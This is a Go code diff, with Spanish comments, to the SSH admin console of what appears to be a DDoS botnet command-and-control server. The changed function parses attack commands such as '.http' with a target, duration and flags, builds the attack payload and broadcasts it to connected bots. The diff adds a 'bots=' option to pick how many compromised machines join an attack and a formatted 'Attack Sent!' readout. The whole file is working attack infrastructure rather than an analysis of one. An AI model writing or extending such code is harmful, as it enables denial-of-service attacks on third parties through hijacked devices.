@@ -1623,15 +1623,46 @@ func AdminSSH(conn net.Conn) {
 
 			//Default case handles attack commands and unknown commands
 			//============================================================================================================================================================================================================================================================================//
-
 		default:
-
-			// Separar el comando en argumentos
 			args := strings.Fields(command)
 			if len(args) == 0 {
 				continue
 			}
 			methodName := strings.ToLower(args[0])
+
+			customBots := 0
+			abort := false
+			if session.User.Admin {
+				newArgs := make([]string, 0, len(args))
+				for _, arg := range args {
+					if strings.HasPrefix(strings.ToLower(arg), "bots=") {
+						parts := strings.SplitN(arg, "=", 2)
+						if len(parts) == 2 {
+							val, err := strconv.Atoi(parts[1])
+							if err != nil {
+								session.Conn.Write([]byte(ansiError + "Invalid bots value, must be integer" + ansiReset + "\r\n"))
+								abort = true
+								break
+							}
+							customBots = val
+						}
+						continue
+					}
+					newArgs = append(newArgs, arg)
+				}
+				args = newArgs
+			} else {
+				for _, arg := range args {
+					if strings.HasPrefix(strings.ToLower(arg), "bots=") {
+						session.Conn.Write([]byte(ansiError + "You are not allowed to use 'bots' flag" + ansiReset + "\r\n"))
+						abort = true
+						break
+					}
+				}
+			}
+			if abort {
+				continue
+			}
 
 			// Si el método es .http y hay suficientes argumentos, parsear URL
 			if methodName == ".http" && len(args) >= 3 {
@@ -1658,21 +1689,19 @@ func AdminSSH(conn net.Conn) {
 					path = "/"
 				}
 
-				// Construir nuevo slice de argumentos
 				newArgs := make([]string, 0, len(args)+3)
 				newArgs = append(newArgs, args[0]) // método
-				newArgs = append(newArgs, host)    // destino (hostname)
+				newArgs = append(newArgs, host)    // destino
 				newArgs = append(newArgs, args[2]) // duración
 				if len(args) > 3 {
-					newArgs = append(newArgs, args[3:]...) // banderas originales
+					newArgs = append(newArgs, args[3:]...)
 				}
-				// Añadir banderas derivadas
 				newArgs = append(newArgs, "domain="+host)
 				newArgs = append(newArgs, "path="+path)
 				newArgs = append(newArgs, "dport="+port)
 
 				args = newArgs
-				methodName = strings.ToLower(args[0]) // actualizar método (sigue siendo .http)
+				methodName = strings.ToLower(args[0])
 			}
 
 			// Validar que el método existe
@@ -1682,37 +1711,88 @@ func AdminSSH(conn net.Conn) {
 				continue
 			}
 
-			// Parsear el ataque con los argumentos transformados
+			// Parsear el ataque
 			payload, err := attack.Parse(args, account)
 			if err != nil {
 				session.Conn.Write([]byte(ansiError + err.Error() + ansiReset + "\r\n"))
 				continue
 			}
 
-			// Generar el slice de bytes a enviar a los bots
+			// Generar el slice de bytes
 			bytes, err := payload.Bytes()
 			if err != nil {
 				session.Conn.Write([]byte(ansiError + "Failed to build attack: " + err.Error() + ansiReset + "\r\n"))
 				continue
 			}
 
-			// Transmitir a todos los bots
-			BroadcastClients(bytes)
+			totalBots := len(Clients)
+			var botsToUse int
 
-			// Mostrar mensaje de éxito
+			if customBots != 0 {
+				// Administrador especificó un número
+				if customBots == -1 {
+					botsToUse = totalBots
+				} else if customBots > 0 && customBots <= totalBots {
+					botsToUse = customBots
+				} else {
+					session.Conn.Write([]byte(ansiError + fmt.Sprintf("Invalid bots value: %d. Must be -1, or between 1 and %d", customBots, totalBots) + ansiReset + "\r\n"))
+					continue
+				}
+			} else {
+				// Lógica de fracción por máximo global
+				maxOngoing := Options.Templates.Attacks.MaximumOngoing
+				if maxOngoing > 1 {
+					botsToUse = totalBots / maxOngoing
+					if botsToUse < 1 {
+						botsToUse = 1
+					}
+				} else {
+					botsToUse = totalBots
+				}
+			}
+
+			// Enviar a la cantidad calculada
+			if botsToUse >= totalBots {
+				BroadcastClients(bytes)
+			} else {
+				BroadcastClientsFraction(bytes, botsToUse)
+			}
+
+			// --- NUEVA SALIDA CON FORMATO DE LISTA ---
+			// Obtener método, target y duración del comando original (sin la flag bots)
 			parts := strings.Fields(command)
-			target := "unknown"
-			duration := "?"
+			methodDisplay := parts[0]
+			targetDisplay := "unknown"
+			durationDisplay := "?"
 			if len(parts) > 1 {
-				target = parts[1]
+				targetDisplay = parts[1]
 			}
 			if len(parts) > 2 {
-				duration = parts[2]
+				durationDisplay = parts[2]
 			}
-			bots := strconv.Itoa(len(Clients))
-			face := redGradientText("X_X")
-			session.Conn.Write([]byte(ansiSuccess + "Attack" + ansiReset + " " + ansiCommands + "sent successfully to " + target + " for " + duration + " with " + bots + " bots " + ansiReset + face + ansiReset + "\r\n"))
 
+			// Construir la lista de flags (excluyendo "bots=" si existe)
+			flagsList := make([]string, 0)
+			for i := 3; i < len(parts); i++ {
+				if !strings.HasPrefix(strings.ToLower(parts[i]), "bots=") {
+					flagsList = append(flagsList, parts[i])
+				}
+			}
+			flagsStr := strings.Join(flagsList, " ")
+
+			botsDisplay := fmt.Sprintf("[%d/%d]", botsToUse, totalBots)
+
+			// Escribir cada línea con formato
+			session.Conn.Write([]byte(ansiSuccess + "• Attack Sent!" + ansiReset + "\r\n"))
+			session.Conn.Write([]byte(fmt.Sprintf("%s• Method\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, methodDisplay, ansiReset)))
+			session.Conn.Write([]byte(fmt.Sprintf("%s• Target\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, targetDisplay, ansiReset)))
+			session.Conn.Write([]byte(fmt.Sprintf("%s• Duration\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, durationDisplay, ansiReset)))
+			if flagsStr != "" {
+				session.Conn.Write([]byte(fmt.Sprintf("%s• Flags\t\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, flagsStr, ansiReset)))
+			} else {
+				session.Conn.Write([]byte(fmt.Sprintf("%s• Flags\t\t: %s[none]%s\r\n", ansiCommands, ansiNumbers, ansiReset)))
+			}
+			session.Conn.Write([]byte(fmt.Sprintf("%s• Bots\t\t: %s%s%s\r\n", ansiCommands, ansiNumbers, botsDisplay, ansiReset)))
 		}
 	}
 }
